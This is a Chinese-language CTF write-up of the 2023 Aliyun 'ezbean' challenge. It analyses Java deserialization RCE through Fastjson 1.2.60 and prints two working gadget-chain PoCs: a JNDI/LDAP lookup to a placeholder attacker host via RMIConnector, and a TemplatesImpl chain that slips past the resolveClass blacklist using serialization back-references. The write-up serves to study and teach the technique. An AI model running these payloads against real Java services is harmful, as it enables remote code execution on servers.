  

> 2023 Aliyun CTF ezbean是一道CTF java反序列化题目。
> 题目的目的是让选手通过一个java原生反序列化入口，最终达成RCE。本文对题目的几种解法做了具体的分析，主要分为预期解法和非预期解法两种思路。通过对Fastjson在反序列化的行为分析，从两个方向攻克本题。

##  **预期解**

题目的逻辑简单清晰，通过 /read 路由可以传入 data 参数进行反序列化。题目的依赖就是 springboot 和 fastjson1.2.60 。

    
    
    package com.ctf.ezser.utils;
    
    import java.io.IOException;
    import java.io.InputStream;
    import java.io.InvalidClassException;
    import java.io.ObjectInputStream;
    import java.io.ObjectStreamClass;
    import java.util.Arrays;
    import java.util.HashSet;
    import java.util.Set;
    
    public class MyObjectInputStream extends ObjectInputStream {
    
       private static final String[] blacklist = new String[]{
               "java\\.security.*", "java\\.rmi.*",  "com\\.fasterxml.*", "com\\.ctf\\.*",
               "org\\.springframework.*", "org\\.yaml.*", "javax\\.management\\.remote.*"
       };
    
       public MyObjectInputStream(InputStream inputStream) throws IOException {
          super(inputStream);
       }
    
       protected Class resolveClass(ObjectStreamClass cls) throws IOException, ClassNotFoundException {
          if(!contains(cls.getName())) {
             return super.resolveClass(cls);
          } else {
             throw new InvalidClassException("Unexpected serialized class", cls.getName());
          }
       }
    
       public static boolean contains(String targetValue) {
          for (String forbiddenPackage : blacklist) {
             if (targetValue.matches(forbiddenPackage))
                return true;
          }
          return false;
       }
    }
    

可以看到 MyObjectInputStream 继承 ObjectInputStream 并重写了 resolveClass()
方法，对反序列化的类进行了检查。

结合黑名单容易想到需要进行二次反序列化，但是常见的二次反序列化的起点类都被 ban 了，结合 pom.xml 中的 Fastjson 依赖考虑使用
Fastjson 进行反序列化。结合题目给的 MyBean 类

    
    
    package com.ctf.ezser.bean;
    
    import java.io.IOException;
    import java.io.Serializable;
    import javax.management.remote.JMXConnector;
    
    public class MyBean implements Serializable {
    
       private Object url;
       private Object message;
       private JMXConnector conn;
    
    
       public MyBean() {}
    
       public MyBean(Object url, Object message) {
          this.url = url;
          this.message = message;
       }
    
       public MyBean(Object url, Object message, JMXConnector conn) {
          this.url = url;
          this.message = message;
          this.conn = conn;
       }
    
       public String getConnect() throws IOException {
          try {
             this.conn.connect();
             return "success";
          } catch (IOException var2) {
             return "fail";
          }
       }
    
       public void connect() {}
    
       public Object getMessage() {
          return this.message;
       }
    
       public void setMessage(Object message) {
          this.message = message;
       }
    
       public Object getUrl() {
          return this.url;
       }
    
       public void setUrl(Object url) {
          this.url = url;
       }
    }

JMXConnector 接口的实现类在题目环境下仅存在 RMIConnector 一种实现类，结合 JMXService 可以在调用
getConnect() 方法时触发 JNDI 查询。这里不难想到利用 Fastjson 调用 Mybean 的 getter 方法。

结合题目可以想到利用 javax.management.BadAttributeValueExpException 作为反序列化起点，这个
BadAttributeException 在反序列化时会对自己的 val 属性调用 toString 方法。

![](https://image.3001.net/images/20230619/1687161911_64900c37acbe697adebbb.png!small)

将 JSONObject 作为 val ，也就相当于调用了 JSONObejct 的 toString() 方法。在 Fastjson<=1.2.48 时
Fastjson 没有实现自己的反序列化逻辑，但在高于 1.2.48 时 Fastjson 的 JSONObject 和 JSONArray 都实现了自己的
readObject()方法。![](https://image.3001.net/images/20230619/1687161938_64900c52a9aae62754b24.png!small)

使用自己的 SecureObjectInputStream 包裹输入流从中获取序列化数据。

![](https://image.3001.net/images/20230619/1687162049_64900cc1b03618a75c4c8.png!small)

其中的 resolveClass 会调用 Fastjson 的 checkAutoType 来检查反序列化的数据是否合法。RMIConnector 和
JMXService 在 Fastjson 1.2.60 中均不属于黑名单，按照 AutoType 的逻辑

![](https://image.3001.net/images/20230619/1687162070_64900cd601caa6f14e23a.png!small)

这里 name 就是 classname 类名。expectClass 为 null。按照这里 autoTypeSupport 应该为 true 才不会
throw error，但是我们实际尝试发现其实并不会报错，但是我们也并没有手动开启 autoType。这是因为在调用 checkAutoType
函数时我们传入的最后一个参数为 Feature.SupportAutoType.mask 而我们进行比较时用的是 feature &
Feature.SupportAutoType.mask ，这里 feature 就是我们传入的
Feature.SupportAutoType.mask，这样就相当于传入了开启 autoType 的选项。

![](https://image.3001.net/images/20230619/1687162097_64900cf1d477da1bc8db8.png!small)

![](https://image.3001.net/images/20230619/1687162112_64900d005a3e75bfa44c6.png!small)

这里经过 mask 后为 true，也就相当于开启了 autoTypeSupport 。

    
    
    JSONObject json= new JSONObject();
    JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi:///jndi/ldap://xxx.xxx.xxx.xxx:1389/Tomcat");
    RMIConnector rmiConnector = new RMIConnector(jmxServiceURL,null);
    MyBean myBean = new MyBean("a","a", rmiConnector);
    json.put("YYY", myBean);
    BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
    Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
    val.setAccessible(true);
    val.set(poc,json);
    byte[] code =  serialize(poc);
    deserialize(code);
    

会出 Exception

> exception in thread "main" com.alibaba.fastjson.JSONException: default
> constructor not found. class javax.management.remote.rmi.RMIConnector at
> com.alibaba.fastjson.util.JavaBeanInfo.build(JavaBeanInfo.java:516) at
> com.alibaba.fastjson.util.JavaBeanInfo.build(JavaBeanInfo.java:221)

阅读 JavaBeanInfo 逻辑可以知道它会尝试获取无参构造函数，我们的 RMIConnector 和 JMXService
都不具备无参数公有构造函数的条件，所以在这里一定会报错。当时比赛卡这里了，后来看了 WP 才知道，多打几次就可以。只需要多
deserialize(code); 几次即可，StrewHat 的 wp 写的是因为 fastjson
构造函数是随机获取，其实并非如此。我们来详细看一下为什么多反序列化几次就可以。![](https://image.3001.net/images/20230619/1687162188_64900d4c677faf9422c2c.png!small)

这里抛出异常

![](https://image.3001.net/images/20230619/1687162208_64900d601085d9b09b5ef.png!small)

这里遍历了全部构造函数，寻找符合要求的构造函数，都找不到所以报错，这里阅读逻辑后发现和顺序没有关系，因为

![](https://image.3001.net/images/20230619/1687162233_64900d790d1d227d8ec42.png!small)![](https://image.3001.net/images/20230619/1687162250_64900d8a674ea430e28a2.png!small)

无论运行多少次都会完整遍历 DeclaredCtor 。那为什么进行多次反序列化后，就可以正常反序列化呢？继续向前看，在 ParserConfig 中

![](https://image.3001.net/images/20230619/1687162276_64900da4a118e4c352196.png!small)

在 build 之前把这个类缓存了，存在一个 static 的 mapping 中

![](https://image.3001.net/images/20230619/1687162309_64900dc52daa6881f565e.png!small)

在第二次反序列化时![](https://image.3001.net/images/20230619/1687162332_64900ddcf20ca6e376a46.png!small)

会在上层代码尝试从缓存获取类中拿到类因而提前返回。也就走不到

JavaBeanInfo.build 这一步，也就不会报错找不到默认构造函数了。因此只需要多打几次 payload 就能成功 rce 。

##  **非预期解**

Y4tacker 师傅前段时间发布了一篇（<https://paper.seebug.org/2055/>）关于

![](https://image.3001.net/images/20230619/1687162480_64900e70f34255399603f.png!small)

的文章，文中提到低版本才能利用，但其实高版本也能利用，这是因为后来有师傅提出可以利用 **java 序列化机制中的引用机制来进行绕过**

  

  * <https://www.cnpanda.net/sec/928.html>

  * <https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/#%E5%AE%8C%E6%95%B4%E5%88%A9%E7%94%A8>

简单来说，高版本不能利用的原因是因为 Fastjson 的 readObject 实现了自己的 resolveClass 逻辑，会 ban
黑名单中的类，比如 TemplatesImpl

    
    
    Object tpl = createTemplatesImpl("open -a Calculator.app");
            JSONObject jsonObject = new JSONObject();
            jsonObject.put("gg",tpl);
    
            BadAttributeValueExpException poc = new BadAttributeValueExpException(null);
            Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
            val.setAccessible(true);
            val.set(poc,jsonObject);
    

反序列化时会因为 TemplatesImpl 处于 fastjson 的黑名单中而被禁止反序列化

![](https://image.3001.net/images/20230619/1687162638_64900f0e39540232ef147.png!small)

这里我们的 **思路就转变为如何绕过 resolveClass 函数检查。** 通过对 java 原生反序列化流程的学习，我们先看在啥时候 java
会去调用 resolveClass
，毕竟反序列化的数据类型也有很多。![](https://image.3001.net/images/20230619/1687162660_64900f24a5f0844851d90.png!small)![](https://image.3001.net/images/20230619/1687162676_64900f3478a2359042f61.png!small)![](https://image.3001.net/images/20230619/1687162696_64900f482eee79961f90e.png!small)

也就是只有 TC_CLASSDESC 会调用 readNonProxyDesc -> resolveClass
。由于我们要尝试绕过的东西本质是一个类，所以这里我们能选择的就是 TC_REFERENCE 或者
TC_PROXYCLASSDESC我们先看看能不能用代理类绕过

![](https://image.3001.net/images/20230619/1687162720_64900f6068aafcfa551d8.png!small)

可以看到在序列化过程中会使用反射判断一个类是否是代理类，若是代理类则写入
TC_PROXYCLASSDESC![](https://image.3001.net/images/20230619/1687164744_64901748c6f633e09a5d7.png!small)

反序列过程中会重建代理类，对于 TemplatesImpl 显然行不通

![](https://image.3001.net/images/20230619/1687162765_64900f8db13b6e68e6d7c.png!small)

一路走不通只能考虑用 TC_REFERENCE 了在序列化过程中

![](https://image.3001.net/images/20230619/1687162784_64900fa0283e435e45aa8.png!small)

如果在 handles 中查到缓存的 obj，那就直接写 TC_REFERENCE

![](https://image.3001.net/images/20230619/1687162804_64900fb46ca2d735971b0.png!small)

也就不会调用 resolveClass

最终 poc，没有用到题目给的 ezBean

    
    
    Object tpl = createTemplatesImpl("open -a Calculator.app");
            JSONObject jsonObject = new JSONObject();
            jsonObject.put("gg",tpl);
    
            BadAttributeValueExpException poc = new BadAttributeValueExpException(null);
            Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
            val.setAccessible(true);
            val.set(poc,jsonObject);
            HashMap hashMap = new HashMap();
            hashMap.put(tpl,poc);
            byte[] code =  serialize(poc);
            deserialize(code);
    

## **总结**

这两种解法有一点异曲同工之妙，预期解利用 Fastjson 的缓存机制避免了找不到默认构造函数的问题，跳过了 BuildJavaBean 的环节；

非预期解则是利用了 Fastjson 中 readObject 不正确的处理序列化数据方式，导致 handle 中已经缓存序列化对象而跳过
resolveClass 进而不被 Fastjson 的 chekcAutoType 黑名单检测。

